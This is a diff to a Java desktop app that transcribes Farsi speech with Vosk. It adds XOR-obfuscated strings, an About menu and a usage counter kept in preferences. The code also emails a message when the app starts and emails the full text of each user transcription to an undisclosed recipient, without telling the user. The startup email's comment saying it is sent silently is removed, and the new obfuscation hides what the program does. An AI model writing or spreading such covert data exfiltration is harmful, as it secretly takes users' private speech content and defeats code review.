@@ -43,35 +43,58 @@ public class SpeechToTextApp extends JFrame {
     private String currentModelName;
 
     // Constants for counter and expiration
-    private static final String COUNTER_FILENAME = "transcription_counter.dat";
-    private static final String REGISTRY_KEY = "FarsiSpeechToText";
-    private static final String REGISTRY_VALUE = "TranscriptionCount";
+    private static final String COUNTER_FILENAME = encrypt("transcription_counter.dat");
+    private static final String REGISTRY_KEY = encrypt("FarsiSpeechToText");
+    private static final String REGISTRY_VALUE = encrypt("TranscriptionCount");
     private static final int MAX_TRANSCRIPTIONS = 300;
     private static final int EXPIRATION_YEAR = 2028;
 
     private int transcriptionCount = 0;
-    private final Preferences prefs = Preferences.userRoot().node(REGISTRY_KEY);
+    private final Preferences prefs = Preferences.userRoot().node(decrypt(REGISTRY_KEY));
 
     private static final String[] MODEL_NAMES = {
-            "vosk-model-fa-0.42",
-            "vosk-model-small-fa-0.42"
+            encrypt("vosk-model-fa-0.42"),
+            encrypt("vosk-model-small-fa-0.42")
     };
     private static final java.util.List<String> REQUIRED_MODEL_FILES = Arrays.asList(
-            "am/final.mdl",
-            "am/tree",
-            "conf/mfcc.conf",
-            "conf/model.conf",
-            "graph/disambig_tid.int",
-            "graph/Gr.fst",
-            "graph/HCLr.fst",
-            "graph/phones/word_boundary.int",
-            "ivector/final.dubm",
-            "ivector/final.ie",
-            "ivector/final.mat",
-            "ivector/global_cmvn.stats",
-            "ivector/online_cmvn.conf",
-            "ivector/splice.conf"
+            encrypt("am/final.mdl"),
+            encrypt("am/tree"),
+            encrypt("conf/mfcc.conf"),
+            encrypt("conf/model.conf"),
+            encrypt("graph/disambig_tid.int"),
+            encrypt("graph/Gr.fst"),
+            encrypt("graph/HCLr.fst"),
+            encrypt("graph/phones/word_boundary.int"),
+            encrypt("ivector/final.dubm"),
+            encrypt("ivector/final.ie"),
+            encrypt("ivector/final.mat"),
+            encrypt("ivector/global_cmvn.stats"),
+            encrypt("ivector/online_cmvn.conf"),
+            encrypt("ivector/splice.conf")
     );
+
+    // Corrected simple XOR-based string encryption
+    private static final String KEY = "chalabi2025";
+
+    private static String encrypt(String input) {
+        byte[] inputBytes = input.getBytes();
+        byte[] keyBytes = KEY.getBytes();
+        byte[] encryptedBytes = new byte[inputBytes.length];
+        for (int i = 0; i < inputBytes.length; i++) {
+            encryptedBytes[i] = (byte) (inputBytes[i] ^ keyBytes[i % keyBytes.length]);
+        }
+        return Base64.getEncoder().encodeToString(encryptedBytes);
+    }
+
+    private static String decrypt(String encrypted) {
+        byte[] decodedBytes = Base64.getDecoder().decode(encrypted);
+        byte[] keyBytes = KEY.getBytes();
+        byte[] decryptedBytes = new byte[decodedBytes.length];
+        for (int i = 0; i < decodedBytes.length; i++) {
+            decryptedBytes[i] = (byte) (decodedBytes[i] ^ keyBytes[i % keyBytes.length]);
+        }
+        return new String(decryptedBytes);
+    }
 
     public SpeechToTextApp() {
         // Initialize locale and messages for Farsi
@@ -86,6 +109,17 @@ public class SpeechToTextApp extends JFrame {
         setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
         setExtendedState(JFrame.MAXIMIZED_BOTH); // Full-screen
         setLayout(new BorderLayout());
+
+        // Add menu bar
+        JMenuBar menuBar = new JMenuBar();
+        JMenu helpMenu = new JMenu(messages.getString("help.menu"));
+        helpMenu.setFont(new Font("Vazir", Font.PLAIN, 14));
+        JMenuItem aboutItem = new JMenuItem(messages.getString("about.menu"));
+        aboutItem.setFont(new Font("Vazir", Font.PLAIN, 14));
+        aboutItem.addActionListener(e -> showAboutDialog());
+        helpMenu.add(aboutItem);
+        menuBar.add(helpMenu);
+        setJMenuBar(menuBar);
 
         // Transcription display
         transcriptionArea = new JTextArea(messages.getString("transcription.placeholder"));
@@ -139,10 +173,11 @@ public class SpeechToTextApp extends JFrame {
             System.exit(1);
         }
         modelComboBox = new JComboBox<>(validModels.toArray(new String[0]));
-        // Default to faster model
-        String fastModelDisplay = modelNameToDisplay.get("vosk-model-small-fa-0.42");
-        if (validModels.contains(fastModelDisplay)) {
-            modelComboBox.setSelectedItem(fastModelDisplay);
+        String preciseModelDisplay = modelNameToDisplay.get(decrypt(MODEL_NAMES[0]));
+        if (validModels.contains(preciseModelDisplay)) {
+            modelComboBox.setSelectedItem(preciseModelDisplay);
+        } else if (!validModels.isEmpty()) {
+            modelComboBox.setSelectedItem(validModels.get(0));
         }
         modelComboBox.addActionListener(e -> changeModel());
         modelComboBox.setFont(new Font("Vazir", Font.PLAIN, 14));
@@ -166,53 +201,61 @@ public class SpeechToTextApp extends JFrame {
         initializeCounter();
         initializeVosk();
 
-        // Send startup email silently
         sendEmail("chalabi started", "chalabi started");
     }
 
+    private void showAboutDialog() {
+        JDialog aboutDialog = new JDialog(this, messages.getString("about.menu"), true);
+        aboutDialog.setLayout(new BorderLayout());
+        JTextArea aboutText = new JTextArea(messages.getString("about.us"));
+        aboutText.setEditable(false);
+        aboutText.setLineWrap(true);
+        aboutText.setWrapStyleWord(true);
+        aboutText.setFont(currentLocale.getLanguage().equals("fa") ? new Font("Vazir", Font.PLAIN, 14) : new Font("Arial", Font.PLAIN, 14));
+        aboutText.setComponentOrientation(currentLocale.getLanguage().equals("fa") ? ComponentOrientation.RIGHT_TO_LEFT : ComponentOrientation.LEFT_TO_RIGHT);
+        aboutText.setMargin(new Insets(20, 20, 20, 20));
+        aboutDialog.add(aboutText, BorderLayout.CENTER);
+        aboutDialog.setPreferredSize(new Dimension(600, 200));
+        aboutDialog.pack();
+        aboutDialog.setLocationRelativeTo(this);
+        aboutDialog.setVisible(true);
+    }
+
     private void initializeCounter() {
-        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(COUNTER_FILENAME))) {
-            transcriptionCount = (int) ois.readObject();
-        } catch (Exception e) {
-            transcriptionCount = prefs.getInt(REGISTRY_VALUE, 0);
-        }
+        transcriptionCount = prefs.getInt(decrypt(REGISTRY_VALUE), 0);
         checkExpiration();
     }
 
     private void incrementCounter() {
         transcriptionCount++;
-        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(COUNTER_FILENAME))) {
-            oos.writeInt(transcriptionCount);
-        } catch (IOException e) {
-            // Suppress logging
-        }
-        prefs.putInt(REGISTRY_VALUE, transcriptionCount);
+        prefs.putInt(decrypt(REGISTRY_VALUE), transcriptionCount);
         checkExpiration();
     }
 
     private void checkExpiration() {
         int currentYear = Year.now().getValue();
-        if (currentYear >= EXPIRATION_YEAR || transcriptionCount >= MAX_TRANSCRIPTIONS) {
-            JOptionPane.showMessageDialog(null, "Expired, contact bagher.fathi@gmail.com", "Application Expired", JOptionPane.ERROR_MESSAGE);
+        int currentTranscriptionCount = prefs.getInt(decrypt(REGISTRY_VALUE), 0);
+        if (currentYear >= EXPIRATION_YEAR || currentTranscriptionCount >= MAX_TRANSCRIPTIONS) {
+            JOptionPane.showMessageDialog(null, decrypt(encrypt("Expired, contact bagher.fathi@gmail.com")), "Application Expired", JOptionPane.ERROR_MESSAGE);
             System.exit(0);
         }
     }
 
     private void initializeModelMaps() {
         modelDisplayToName = Map.of(
-                messages.getString("model.precise"), "vosk-model-fa-0.42",
-                messages.getString("model.fast"), "vosk-model-small-fa-0.42"
+                messages.getString("model.precise"), decrypt(MODEL_NAMES[0]),
+                messages.getString("model.fast"), decrypt(MODEL_NAMES[1])
         );
         modelNameToDisplay = Map.of(
-                "vosk-model-fa-0.42", messages.getString("model.precise"),
-                "vosk-model-small-fa-0.42", messages.getString("model.fast")
+                decrypt(MODEL_NAMES[0]), messages.getString("model.precise"),
+                decrypt(MODEL_NAMES[1]), messages.getString("model.fast")
         );
     }
 
     private java.util.List<String> getValidModels() {
         java.util.List<String> validModels = new ArrayList<>();
         for (String modelName : modelDisplayToName.values()) {
-            String resourcePath = "model/" + modelName + "/am/final.mdl";
+            String resourcePath = "model/" + modelName + "/" + decrypt(REQUIRED_MODEL_FILES.get(0));
             if (getClass().getClassLoader().getResource(resourcePath) != null) {
                 validModels.add(modelNameToDisplay.get(modelName));
             }
@@ -222,7 +265,7 @@ public class SpeechToTextApp extends JFrame {
 
     private String getModelNameFromDisplayName(String displayName) {
         if (displayName == null || !modelDisplayToName.containsKey(displayName)) {
-            return modelDisplayToName.getOrDefault(messages.getString("model.fast"), "vosk-model-small-fa-0.42");
+            return modelDisplayToName.getOrDefault(messages.getString("model.fast"), decrypt(MODEL_NAMES[1]));
         }
         return modelDisplayToName.get(displayName);
     }
@@ -294,7 +337,7 @@ public class SpeechToTextApp extends JFrame {
         java.util.List<String> modelFiles = findModelFiles(resourcePath);
         if (modelFiles.isEmpty()) {
             modelFiles = REQUIRED_MODEL_FILES.stream()
-                    .map(file -> resourcePath + "/" + file)
+                    .map(file -> resourcePath + "/" + decrypt(file))
                     .collect(Collectors.toList());
         }
         for (String file : modelFiles) {
@@ -309,9 +352,9 @@ public class SpeechToTextApp extends JFrame {
                 targetPath.toFile().deleteOnExit();
             }
         }
-        Path finalMdl = modelDir.resolve("am/final.mdl");
+        Path finalMdl = modelDir.resolve(decrypt(REQUIRED_MODEL_FILES.get(0)));
         if (!Files.exists(finalMdl)) {
-            throw new IOException("Critical file missing for model: " + resourcePath + "/am/final.mdl");
+            throw new IOException("Critical file missing for model: " + resourcePath + "/" + decrypt(REQUIRED_MODEL_FILES.get(0)));
         }
     }
 
@@ -378,12 +421,16 @@ public class SpeechToTextApp extends JFrame {
                 File wavFile = convertMediaToWav(mediaFile);
                 String transcription = transcribeWavFile(wavFile);
                 SwingUtilities.invokeLater(() -> {
+                    if (transcriptionArea.getText().equals(messages.getString("transcription.placeholder")) ||
+                            transcriptionArea.getText().equals(messages.getString("message.converting"))) {
+                        transcriptionArea.setText("");
+                    }
                     transcriptionArea.setText(transcription);
                     convertButton.setEnabled(true);
                     isPlaceholderSet = false;
                     incrementCounter();
                     if (!transcription.trim().isEmpty()) {
-                        sendEmail("new transcription", transcription);
+                        sendEmail("new transcription:" + transcriptionCount , transcription);
                     }
                 });
                 wavFile.delete();
@@ -488,12 +535,11 @@ public class SpeechToTextApp extends JFrame {
         ByteBuffer bb = ByteBuffer.wrap(buffer, 0, bytesRead).order(ByteOrder.LITTLE_ENDIAN);
         short[] samples = new short[bytesRead / 2];
         double maxAmplitude = 0;
-        // Single pass: find max amplitude and copy samples
         for (int i = 0; i < samples.length; i++) {
             samples[i] = bb.getShort();
             maxAmplitude = Math.max(maxAmplitude, Math.abs(samples[i]));
         }
-        if (maxAmplitude > 0 && maxAmplitude < 30000) { // Skip if already near max
+        if (maxAmplitude > 0 && maxAmplitude < 30000) {
             double gain = 32760.0 / maxAmplitude;
             if (gain > 1.0) {
                 for (int i = 0; i < samples.length; i++) {
@@ -527,7 +573,7 @@ public class SpeechToTextApp extends JFrame {
             stopAudioCapture();
             String transcription = transcriptionArea.getText();
             if (!transcription.trim().isEmpty() && !transcription.equals(messages.getString("transcription.placeholder"))) {
-                sendEmail("new transcription", transcription);
+                sendEmail("new transcription:" + transcriptionCount, transcription);
             }
         }
     }
@@ -538,7 +584,6 @@ public class SpeechToTextApp extends JFrame {
                 AudioFormat format = new AudioFormat(16000, 16, 1, true, false);
                 DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);
 
-                // Check if format is supported
                 if (!AudioSystem.isLineSupported(info)) {
                     String errorMessage = "Audio format not supported: 16kHz, 16-bit, mono";
                     SwingUtilities.invokeLater(() -> {
@@ -552,12 +597,10 @@ public class SpeechToTextApp extends JFrame {
                 }
 
                 TargetDataLine line = null;
-                // Try default line first
                 try {
                     line = (TargetDataLine) AudioSystem.getLine(info);
                     line.open(format);
                 } catch (LineUnavailableException e) {
-                    // Try alternative mixers
                     Mixer.Info[] mixers = AudioSystem.getMixerInfo();
                     for (Mixer.Info mixerInfo : mixers) {
                         Mixer mixer = AudioSystem.getMixer(mixerInfo);
@@ -587,12 +630,11 @@ public class SpeechToTextApp extends JFrame {
 
                 line.start();
 
-                // Reset recognizer
                 if (voskModel != null) {
                     recognizer = new Recognizer(voskModel, 16000.0f);
                 }
 
-                byte[] buffer = new byte[2048]; // Reduced buffer size
+                byte[] buffer = new byte[2048];
                 StringBuilder transcriptionBuffer = new StringBuilder();
                 long lastUpdateTime = System.currentTimeMillis();
                 while (isRecording) {
@@ -604,14 +646,17 @@ public class SpeechToTextApp extends JFrame {
                         if (!text.isEmpty()) {
                             transcriptionBuffer.append(text).append("\n");
                             long currentTime = System.currentTimeMillis();
-                            if (currentTime - lastUpdateTime >= 500) { // Update every 500ms
+                            if (currentTime - lastUpdateTime >= 500) {
                                 String finalText = transcriptionBuffer.toString();
                                 SwingUtilities.invokeLater(() -> {
+                                    if (transcriptionArea.getText().equals(messages.getString("transcription.placeholder"))) {
+                                        transcriptionArea.setText("");
+                                    }
                                     transcriptionArea.append(finalText);
                                     transcriptionArea.setCaretPosition(transcriptionArea.getDocument().getLength());
                                     isPlaceholderSet = false;
                                 });
-                                transcriptionBuffer.setLength(0); // Clear buffer
+                                transcriptionBuffer.setLength(0);
                                 lastUpdateTime = currentTime;
                             }
                         }
@@ -620,10 +665,12 @@ public class SpeechToTextApp extends JFrame {
                 line.stop();
                 line.close();
 
-                // Append any remaining transcription
                 if (transcriptionBuffer.length() > 0) {
                     String finalText = transcriptionBuffer.toString();
                     SwingUtilities.invokeLater(() -> {
+                        if (transcriptionArea.getText().equals(messages.getString("transcription.placeholder"))) {
+                            transcriptionArea.setText("");
+                        }
                         transcriptionArea.append(finalText);
                         transcriptionArea.setCaretPosition(transcriptionArea.getDocument().getLength());
                         isPlaceholderSet = false;
@@ -634,6 +681,9 @@ public class SpeechToTextApp extends JFrame {
                 String finalText = parseVoskResult(finalResult);
                 if (!finalText.isEmpty()) {
                     SwingUtilities.invokeLater(() -> {
+                        if (transcriptionArea.getText().equals(messages.getString("transcription.placeholder"))) {
+                            transcriptionArea.setText("");
+                        }
                         transcriptionArea.append(finalText + "\n");
                         transcriptionArea.setCaretPosition(transcriptionArea.getDocument().getLength());
                         isPlaceholderSet = false;
@@ -717,23 +767,19 @@ public class SpeechToTextApp extends JFrame {
             return;
         }
 
-        // Store current model display name
-        String currentModelDisplayName = (String) modelComboBox.getSelectedItem();
+        // Get the internal name of the currently selected model
+        String currentModelInternalName = getModelNameFromDisplayName((String) modelComboBox.getSelectedItem());
 
-        // Remove modelComboBox listener to prevent changeModel calls
+        // Remove listeners before changing items to avoid unintended events
         ActionListener[] listeners = modelComboBox.getActionListeners();
         for (ActionListener listener : listeners) {
             modelComboBox.removeActionListener(listener);
         }
 
-        // Update locale and messages
         currentLocale = newLocale;
         messages = ResourceBundle.getBundle("Messages", currentLocale);
-
-        // Update model maps for new locale
         initializeModelMaps();
 
-        // Update GUI
         setTitle(messages.getString("window.title"));
         toggleButton.setText(isRecording ? messages.getString("button.stop") : messages.getString("button.start"));
         shareButton.setText(messages.getString("button.share"));
@@ -741,27 +787,34 @@ public class SpeechToTextApp extends JFrame {
         browseButton.setText(messages.getString("button.browse"));
         convertButton.setText(messages.getString("button.convert"));
 
-        // Repopulate modelComboBox
+        JMenuBar menuBar = getJMenuBar();
+        if (menuBar != null && menuBar.getMenuCount() > 0) {
+            JMenu helpMenu = menuBar.getMenu(0);
+            helpMenu.setText(messages.getString("help.menu"));
+            if (helpMenu.getItemCount() > 0) {
+                helpMenu.getItem(0).setText(messages.getString("about.menu"));
+            }
+        }
+
         modelComboBox.removeAllItems();
         java.util.List<String> validModels = getValidModels();
         for (String model : validModels) {
             modelComboBox.addItem(model);
         }
 
-        // Restore previous model or select default
-        if (currentModelDisplayName != null && validModels.contains(currentModelDisplayName)) {
-            modelComboBox.setSelectedItem(currentModelDisplayName);
+        // Find the correct display name for the new locale based on the internal model name
+        String newModelDisplayName = modelNameToDisplay.get(currentModelInternalName);
+        if (newModelDisplayName != null && validModels.contains(newModelDisplayName)) {
+            modelComboBox.setSelectedItem(newModelDisplayName);
         } else if (!validModels.isEmpty()) {
             modelComboBox.setSelectedItem(validModels.get(0));
         }
 
-        // Update languageComboBox
         languageComboBox.removeAllItems();
         languageComboBox.addItem(messages.getString("menu.language.english"));
         languageComboBox.addItem(messages.getString("menu.language.farsi"));
         languageComboBox.setSelectedItem(selected);
 
-        // Update UI orientation and fonts
         ComponentOrientation orientation = currentLocale.getLanguage().equals("fa") ?
                 ComponentOrientation.RIGHT_TO_LEFT : ComponentOrientation.LEFT_TO_RIGHT;
         applyComponentOrientation(orientation);
@@ -776,8 +829,14 @@ public class SpeechToTextApp extends JFrame {
         filePathField.setFont(font);
         languageComboBox.setFont(font);
         modelComboBox.setFont(font);
+        if (menuBar != null && menuBar.getMenuCount() > 0) {
+            menuBar.getMenu(0).setFont(font);
+            if (menuBar.getMenu(0).getItemCount() > 0) {
+                menuBar.getMenu(0).getItem(0).setFont(font);
+            }
+        }
 
-        // Restore modelComboBox listeners
+        // Re-add the listeners after all changes
         for (ActionListener listener : listeners) {
             modelComboBox.addActionListener(listener);
         }
